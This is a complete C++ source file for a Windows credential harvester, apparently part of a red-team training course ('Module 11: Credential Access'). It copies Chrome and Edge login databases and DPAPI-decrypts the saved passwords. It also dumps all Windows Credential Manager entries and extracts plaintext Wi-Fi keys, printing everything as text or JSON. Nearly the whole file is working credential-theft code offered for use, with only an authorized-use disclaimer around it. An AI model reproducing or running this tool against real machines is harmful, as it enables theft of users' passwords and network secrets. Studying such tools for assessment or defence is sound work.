/*
 * cred_harvester.cpp — Credential Harvester (Red Team / Security Assessment)
 * Module 11: Credential Access
 *
 * Complete, standalone credential harvester.
 * FOR AUTHORIZED USE ONLY on systems you own or have explicit written permission
 * to test. Running this against systems you do not own is illegal.
 *
 * CLI:
 *   cred_harvester.exe all              -- run all modules, print everything
 *   cred_harvester.exe dpapi <b64blob>  -- DPAPI-decrypt a base64 blob
 *   cred_harvester.exe chrome           -- Chrome/Edge saved passwords
 *   cred_harvester.exe credman          -- Windows Credential Manager dump
 *   cred_harvester.exe wifi             -- Wi-Fi saved PSKs
 *   (add --format json to any command for JSON output)
 *
 * Compile:
 *   g++ -std=c++17 -Wall -o cred_harvester.exe cred_harvester.cpp \
 *       -ladvapi32 -lcrypt32 -lwlanapi -lole32
 *
 * Note on WiFi: requires elevation for plaintext keys.
 * Note on Chrome: requires sqlite3.exe in PATH.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <wincred.h>
#include <wlanapi.h>
#include <objbase.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <string>
#include <vector>
#include <algorithm>
#include <sstream>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

// ============================================================================
// Global: JSON output mode
// ============================================================================
static bool g_json = false;

// ============================================================================
// Base64 (RFC 4648, inline — no external lib)
// ============================================================================
static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static const signed char B64INV[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
};

static std::string B64Enc(const BYTE* d, size_t n) {
    std::string o; o.reserve(((n+2)/3)*4);
    for (size_t i = 0; i < n; i += 3) {
        unsigned u = (unsigned)d[i] << 16;
        if (i+1 < n) u |= (unsigned)d[i+1] << 8;
        if (i+2 < n) u |= (unsigned)d[i+2];
        o += B64[(u>>18)&63]; o += B64[(u>>12)&63];
        o += (i+1<n) ? B64[(u>>6)&63] : '=';
        o += (i+2<n) ? B64[(u  )&63] : '=';
    }
    return o;
}

static std::vector<BYTE> B64Dec(const std::string& s) {
    std::vector<BYTE> o; o.reserve((s.size()/4)*3);
    int buf = 0, bits = 0;
    for (unsigned char c : s) {
        signed char v = B64INV[c];
        if (v < -1) break;
        if (v < 0) continue;
        buf = (buf<<6)|v; bits += 6;
        if (bits >= 8) { bits -= 8; o.push_back((BYTE)(buf>>bits)); buf &= (1<<bits)-1; }
    }
    return o;
}

// ============================================================================
// Utility
// ============================================================================
static std::string GetLocalAppData() {
    char b[MAX_PATH]={0};
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, b);
    return b;
}
static std::string GetTempDir() {
    char b[MAX_PATH]={0}; GetTempPathA(MAX_PATH,b); return b;
}
static bool IsPrintA(const BYTE* d, size_t n) {
    for (size_t i=0;i<n;i++) if (d[i]<0x20||d[i]>0x7E) return false;
    return true;
}
static std::string WtoA(const std::wstring& w) {
    if (w.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8,0,w.c_str(),(int)w.size(),NULL,0,NULL,NULL);
    if (n<=0) return "";
    std::string s(n,'\0');
    WideCharToMultiByte(CP_UTF8,0,w.c_str(),(int)w.size(),&s[0],n,NULL,NULL);
    return s;
}
static std::string GuidStr(const GUID& g) {
    char b[64];
    snprintf(b,sizeof(b),"{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
        g.Data1,g.Data2,g.Data3,
        g.Data4[0],g.Data4[1],g.Data4[2],g.Data4[3],
        g.Data4[4],g.Data4[5],g.Data4[6],g.Data4[7]);
    return b;
}
// JSON escape a string
static std::string JEsc(const std::string& s) {
    std::string o; o.reserve(s.size()+4);
    for (unsigned char c : s) {
        if      (c == '"')  o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else if (c == '\n') o += "\\n";
        else if (c == '\r') o += "\\r";
        else if (c < 0x20)  { char h[8]; snprintf(h,sizeof(h),"\\u%04X",c); o+=h; }
        else                o += (char)c;
    }
    return o;
}
// Convert hex string to bytes
static std::vector<BYTE> HexBytes(const std::string& hex) {
    std::vector<BYTE> o;
    for (size_t i=0; i+1<hex.size(); i+=2) {
        unsigned b=0; if(sscanf(hex.c_str()+i,"%02x",&b)==1) o.push_back((BYTE)b);
    }
    return o;
}
// Split into up to maxP parts on delim
static std::vector<std::string> SplitN(const std::string& s, char d, size_t maxP) {
    std::vector<std::string> p;
    size_t st=0;
    while (p.size()+1<maxP) {
        size_t pos=s.find(d,st); if(pos==std::string::npos) break;
        p.push_back(s.substr(st,pos-st)); st=pos+1;
    }
    p.push_back(s.substr(st)); return p;
}
static std::wstring XmlTag(const std::wstring& xml, const std::wstring& tag) {
    std::wstring o=L"<"+tag+L">", c=L"</"+tag+L">";
    size_t s=xml.find(o); if(s==std::wstring::npos) return L"";
    s+=o.size(); size_t e=xml.find(c,s); if(e==std::wstring::npos) return L"";
    return xml.substr(s,e-s);
}

// ============================================================================
// DPAPI
// ============================================================================
static std::string DPDecrypt(const std::vector<BYTE>& raw) {
    if (raw.empty()) return "";
    DATA_BLOB bi={(DWORD)raw.size(),(BYTE*)raw.data()}, bo={0};
    if (!CryptUnprotectData(&bi,NULL,NULL,NULL,NULL,0,&bo)) return "";
    std::string r((char*)bo.pbData,bo.cbData);
    LocalFree(bo.pbData); return r;
}
static std::string DPEncrypt(const std::string& plain) {
    DATA_BLOB bi={(DWORD)plain.size(),(BYTE*)plain.data()}, bo={0};
    if (!CryptProtectData(&bi,L"cred_harvester",NULL,NULL,NULL,0,&bo)) return "";
    std::string r=B64Enc(bo.pbData,bo.cbData);
    LocalFree(bo.pbData); return r;
}

// ============================================================================
// Module 1: DPAPI decrypt a base64 blob
// ============================================================================
static void ModDPAPI(const char* b64) {
    if (!g_json) printf("\n[DPAPI Decrypt]\n");
    auto raw = B64Dec(b64);
    if (raw.empty()) {
        if (!g_json) printf("  [!] base64 decode failed or empty input.\n");
        else         printf("{\"source\":\"dpapi\",\"error\":\"base64_decode_failed\"}\n");
        return;
    }
    std::string plain = DPDecrypt(raw);
    if (plain.empty()) {
        DWORD err = GetLastError();
        if (!g_json) printf("  [!] CryptUnprotectData failed: %lu\n", err);
        else         printf("{\"source\":\"dpapi\",\"error\":\"decrypt_failed\",\"winerror\":%lu}\n", err);
        return;
    }
    if (!g_json) {
        printf("  Decrypted (%zu bytes): ", plain.size());
        if (IsPrintA((const BYTE*)plain.data(), plain.size()))
            printf("%s\n", plain.c_str());
        else {
            printf("[hex] ");
            for (unsigned char c : plain) printf("%02X", c);
            printf("\n");
        }
    } else {
        printf("{\"source\":\"dpapi\",\"plaintext\":\"%s\"}\n", JEsc(plain).c_str());
    }
}

// ============================================================================
// Module 2: Chrome / Edge saved passwords
// ============================================================================
static bool Sqlite3Available() {
    FILE* fp = _popen("sqlite3.exe --version 2>nul", "r");
    if (!fp) return false;
    char b[32]={0}; bool ok=(fgets(b,sizeof(b),fp)&&strlen(b)>0);
    _pclose(fp); return ok;
}

static void PrintChromeCred(const std::string& url, const std::string& user,
                              const std::string& pass) {
    if (!g_json) {
        std::string u2=url; if(u2.size()>49) u2=u2.substr(0,46)+"...";
        printf("  %-50s | %-25s | %s\n", u2.c_str(), user.c_str(), pass.c_str());
    } else {
        printf("{\"source\":\"chrome\",\"url\":\"%s\",\"username\":\"%s\",\"password\":\"%s\"}\n",
               JEsc(url).c_str(), JEsc(user).c_str(), JEsc(pass).c_str());
    }
}

static void ProcessBrowserDB(const std::string& name, const std::string& src) {
    if (!g_json) printf("\n  [Browser: %s]\n", name.c_str());

    if (GetFileAttributesA(src.c_str())==INVALID_FILE_ATTRIBUTES) {
        if (!g_json) printf("  Not installed or profile not found.\n");
        return;
    }
    std::string tmp = GetTempDir() + name + "_ldata.db";
    if (!CopyFileA(src.c_str(), tmp.c_str(), FALSE)) {
        DWORD e=GetLastError();
        if (!g_json) {
            if (e==ERROR_SHARING_VIOLATION)
                printf("  [!] Sharing violation — close %s first. (err=%lu)\n", name.c_str(), e);
            else
                printf("  [!] CopyFile failed: %lu\n", e);
        }
        return;
    }

    std::string cmd = "sqlite3.exe \"" + tmp + "\""
        " \"SELECT origin_url,username_value,hex(password_value) FROM logins;\" 2>nul";
    FILE* fp = _popen(cmd.c_str(), "r");
    if (!fp) { DeleteFileA(tmp.c_str()); return; }

    if (!g_json) {
        printf("  %-50s | %-25s | %s\n","URL","Username","Password");
        printf("  %s\n", std::string(110,'-').c_str());
    }

    int found=0;
    char line[8192]={0};
    while (fgets(line, sizeof(line), fp)) {
        size_t len=strlen(line);
        while (len>0&&(line[len-1]=='\n'||line[len-1]=='\r')) line[--len]=0;
        if (!len) continue;

        auto parts = SplitN(std::string(line),'|',3);
        if (parts.size()<3) continue;
        std::string url=parts[0], user=parts[1], hexBlob=parts[2];

        if (hexBlob.empty()) { PrintChromeCred(url,user,"[NO PASSWORD]"); found++; continue; }

        auto raw = HexBytes(hexBlob);
        if (raw.size()>=3 && raw[0]=='v' && raw[1]=='1' && (raw[2]=='0'||raw[2]=='1')) {
            PrintChromeCred(url, user, "[ENCRYPTED — Chrome App-Bound key (v1x)]");
        } else {
            std::string plain = DPDecrypt(raw);
            if (plain.empty()) {
                char hprev[72]={0}; int pos=0;
                size_t show=(raw.size()<16)?raw.size():16;
                for (size_t i=0;i<show;i++) pos+=snprintf(hprev+pos,sizeof(hprev)-pos,"%02X",raw[i]);
                PrintChromeCred(url, user, std::string("[DPAPI FAILED: ")+hprev+"]");
            } else if (IsPrintA((const BYTE*)plain.data(), plain.size())) {
                PrintChromeCred(url, user, plain);
            } else {
                std::string h;
                for (unsigned char c:plain) {char x[4];snprintf(x,sizeof(x),"%02X",c);h+=x;}
                PrintChromeCred(url, user, "[HEX] "+h);
            }
        }
        found++;
    }
    _pclose(fp);
    DeleteFileA(tmp.c_str());
    if (!g_json) printf("  Found %d login(s).\n", found);
}

static void ModChrome() {
    if (!g_json) printf("\n[Chrome/Edge Saved Passwords]\n");
    if (!Sqlite3Available()) {
        if (!g_json) {
            printf("  [!] sqlite3.exe not found in PATH.\n");
            printf("      Download: https://www.sqlite.org/download.html\n");
        } else {
            printf("{\"source\":\"chrome\",\"error\":\"sqlite3_not_found\"}\n");
        }
        return;
    }
    std::string lad = GetLocalAppData();
    if (lad.empty()) {
        if (!g_json) printf("  [!] LOCALAPPDATA unavailable.\n");
        return;
    }
    ProcessBrowserDB("Chrome", lad+"\\Google\\Chrome\\User Data\\Default\\Login Data");
    ProcessBrowserDB("Edge",   lad+"\\Microsoft\\Edge\\User Data\\Default\\Login Data");
}

// ============================================================================
// Module 3: Windows Credential Manager
// ============================================================================
static const char* CTypeName(DWORD t) {
    switch(t) {
        case CRED_TYPE_GENERIC:                 return "GENERIC";
        case CRED_TYPE_DOMAIN_PASSWORD:         return "DOMAIN_PASSWORD";
        case CRED_TYPE_DOMAIN_CERTIFICATE:      return "DOMAIN_CERTIFICATE";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "DOMAIN_VISIBLE_PASSWORD";
        case CRED_TYPE_GENERIC_CERTIFICATE:     return "GENERIC_CERTIFICATE";
        default:                                return "UNKNOWN";
    }
}
static const char* CPersist(DWORD p) {
    switch(p) {
        case CRED_PERSIST_SESSION:       return "SESSION";
        case CRED_PERSIST_LOCAL_MACHINE: return "LOCAL_MACHINE";
        case CRED_PERSIST_ENTERPRISE:    return "ENTERPRISE";
        default:                         return "UNKNOWN";
    }
}
static bool LooksUtf16(const BYTE* d, DWORD n) {
    if (n<2||n%2) return false;
    const WCHAR* w=(const WCHAR*)d; DWORD c=n/sizeof(WCHAR);
    for (DWORD i=0;i<c;i++) if(w[i]<0x0020||w[i]>0xFFFD) return false;
    return true;
}

static void PrintCredEntry(const CREDENTIALA* cred) {
    std::string target  = cred->TargetName  ? cred->TargetName  : "";
    std::string user    = cred->UserName    ? cred->UserName    : "";
    std::string type    = CTypeName(cred->Type);
    std::string persist = CPersist(cred->Persist);
    DWORD bsz = cred->CredentialBlobSize;
    BYTE* bptr= cred->CredentialBlob;

    std::string blobStr;
    if (bsz == 0) {
        blobStr = "[no blob]";
    } else if (cred->Type == CRED_TYPE_DOMAIN_PASSWORD && LooksUtf16(bptr,bsz)) {
        blobStr = WtoA(std::wstring((WCHAR*)bptr, bsz/sizeof(WCHAR)));
    } else if (IsPrintA(bptr, bsz)) {
        blobStr = std::string((char*)bptr, bsz);
    } else if (LooksUtf16(bptr,bsz)) {
        blobStr = WtoA(std::wstring((WCHAR*)bptr, bsz/sizeof(WCHAR)));
    } else {
        std::string h;
        size_t show=(bsz<32)?bsz:32;
        for (size_t i=0;i<show;i++) {char x[4];snprintf(x,sizeof(x),"%02X",bptr[i]);h+=x;}
        if (bsz>32) h+="...";
        blobStr = "[hex] "+h;
        // flag DPAPI blob
        if (bsz>=4 && bptr[0]==0x01&&bptr[1]==0x00&&bptr[2]==0x00&&bptr[3]==0x00)
            blobStr += " [DPAPI]";
    }

    if (!g_json) {
        printf("  Target  : %s\n", target.c_str());
        printf("  Type    : %s | Persist: %s\n", type.c_str(), persist.c_str());
        printf("  User    : %s\n", user.empty() ? "(none)" : user.c_str());
        printf("  Blob    : %s  (%lu bytes)\n\n", blobStr.c_str(), bsz);
    } else {
        printf("{\"source\":\"credman\",\"target\":\"%s\",\"type\":\"%s\","
               "\"username\":\"%s\",\"blob\":\"%s\",\"blobsize\":%lu}\n",
               JEsc(target).c_str(), JEsc(type).c_str(),
               JEsc(user).c_str(), JEsc(blobStr).c_str(), bsz);
    }
}

static void ModCredMan() {
    if (!g_json) printf("\n[Windows Credential Manager]\n");

    DWORD count=0; PCREDENTIALA* pp=NULL;
    BOOL ok = CredEnumerateA(NULL,0,&count,&pp);
    if (!ok) {
        DWORD err=GetLastError();
        if (err==ERROR_NOT_FOUND) {
            if (!g_json) printf("  Credential Manager is empty.\n");
        } else {
            if (!g_json) printf("  CredEnumerateA failed: %lu\n", err);
            else         printf("{\"source\":\"credman\",\"error\":\"enumerate_failed\",\"winerror\":%lu}\n",err);
        }
        return;
    }

    if (!g_json) printf("  Found %lu credential(s):\n\n", count);
    for (DWORD i=0;i<count;i++) PrintCredEntry(pp[i]);
    CredFree(pp);
}

// ============================================================================
// Module 4: Wi-Fi PSK
// ============================================================================
static void ModWifi() {
    if (!g_json) printf("\n[Wi-Fi Saved PSKs]\n");

    HANDLE hClient=NULL; DWORD ver=0;
    DWORD r = WlanOpenHandle(2,NULL,&ver,&hClient);
    if (r!=ERROR_SUCCESS) {
        if (!g_json) printf("  WlanOpenHandle failed: %lu\n", r);
        else         printf("{\"source\":\"wifi\",\"error\":\"wlan_open_failed\",\"winerror\":%lu}\n",r);
        return;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList=NULL;
    r = WlanEnumInterfaces(hClient,NULL,&pIfList);
    if (r!=ERROR_SUCCESS) {
        if (!g_json) printf("  WlanEnumInterfaces failed: %lu\n", r);
        WlanCloseHandle(hClient,NULL); return;
    }

    if (!g_json) printf("  %lu interface(s).\n", pIfList->dwNumberOfItems);

    for (DWORD i=0; i<pIfList->dwNumberOfItems; i++) {
        WLAN_INTERFACE_INFO* pIf = &pIfList->InterfaceInfo[i];
        if (!g_json) wprintf(L"  Interface: %s\n", pIf->strInterfaceDescription);

        PWLAN_PROFILE_INFO_LIST pProfList=NULL;
        if (WlanGetProfileList(hClient,&pIf->InterfaceGuid,NULL,&pProfList)!=ERROR_SUCCESS)
            continue;

        for (DWORD j=0; j<pProfList->dwNumberOfItems; j++) {
            const WCHAR* profName = pProfList->ProfileInfo[j].strProfileName;
            std::string ssid = WtoA(profName);

            PWSTR pXml=NULL;
            DWORD flags=WLAN_PROFILE_GET_PLAINTEXT_KEY, access=0;
            DWORD res = WlanGetProfile(hClient,&pIf->InterfaceGuid,profName,
                                        NULL,&pXml,&flags,&access);

            std::string psk;
            if (res==ERROR_SUCCESS && pXml) {
                std::wstring xml(pXml);
                WlanFreeMemory(pXml);
                std::wstring km = XmlTag(xml, L"keyMaterial");
                psk = km.empty() ? "[OPEN]" : WtoA(km);
            } else if (res==ERROR_ACCESS_DENIED) {
                psk = "[REQUIRES ELEVATION]";
                if (pXml) WlanFreeMemory(pXml);
            } else {
                psk = "[ERROR "+std::to_string(res)+"]";
                if (pXml) WlanFreeMemory(pXml);
            }

            if (!g_json) {
                printf("    %-35s  %s\n", ssid.c_str(), psk.c_str());
            } else {
                printf("{\"source\":\"wifi\",\"ssid\":\"%s\",\"psk\":\"%s\"}\n",
                       JEsc(ssid).c_str(), JEsc(psk).c_str());
            }
        }
        WlanFreeMemory(pProfList);
    }

    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient,NULL);
}

// ============================================================================
// main
// ============================================================================
static void PrintUsage(const char* prog) {
    printf("Usage:\n");
    printf("  %s all              -- run all modules\n", prog);
    printf("  %s dpapi <b64blob>  -- DPAPI-decrypt a base64 blob\n", prog);
    printf("  %s chrome           -- Chrome/Edge saved passwords\n", prog);
    printf("  %s credman          -- Credential Manager dump\n", prog);
    printf("  %s wifi             -- Wi-Fi saved PSKs\n", prog);
    printf("\nOptions:\n");
    printf("  --format json       -- JSON output (one object per line)\n");
    printf("\nNotes:\n");
    printf("  wifi requires elevation for plaintext keys.\n");
    printf("  chrome requires sqlite3.exe in PATH.\n");
    printf("  AUTHORIZED USE ONLY.\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) { PrintUsage(argv[0]); return 1; }

    // Parse --format json anywhere in argv
    const char* mode = NULL;
    const char* b64arg = NULL;
    for (int i=1; i<argc; i++) {
        if (_stricmp(argv[i],"--format")==0 && i+1<argc && _stricmp(argv[i+1],"json")==0) {
            g_json = true;
            i++;
        } else if (!mode) {
            mode = argv[i];
        } else if (!b64arg) {
            b64arg = argv[i];
        }
    }
    if (!mode) { PrintUsage(argv[0]); return 1; }

    if (!g_json) {
        printf("=== Credential Harvester — Module 11: Credential Access ===\n");
        printf("AUTHORIZED USE ONLY.\n");
    }

    if (_stricmp(mode,"all")==0) {
        ModChrome();
        ModCredMan();
        ModWifi();
        // DPAPI self-test in 'all' mode
        if (!g_json) {
            printf("\n[DPAPI Self-Test]\n");
            std::string b64 = DPEncrypt("harvest_test_secret");
            if (!b64.empty()) {
                printf("  Encrypted: %s\n", b64.c_str());
                ModDPAPI(b64.c_str());
            } else {
                printf("  [!] DPEncrypt failed.\n");
            }
        }
    } else if (_stricmp(mode,"dpapi")==0) {
        if (!b64arg) { fprintf(stderr,"[!] Usage: %s dpapi <base64blob>\n",argv[0]); return 1; }
        ModDPAPI(b64arg);
    } else if (_stricmp(mode,"chrome")==0) {
        ModChrome();
    } else if (_stricmp(mode,"credman")==0) {
        ModCredMan();
    } else if (_stricmp(mode,"wifi")==0) {
        ModWifi();
    } else {
        fprintf(stderr,"[!] Unknown command: %s\n", mode);
        PrintUsage(argv[0]);
        return 1;
    }

    if (!g_json) printf("\n[*] Done.\n");
    return 0;
}
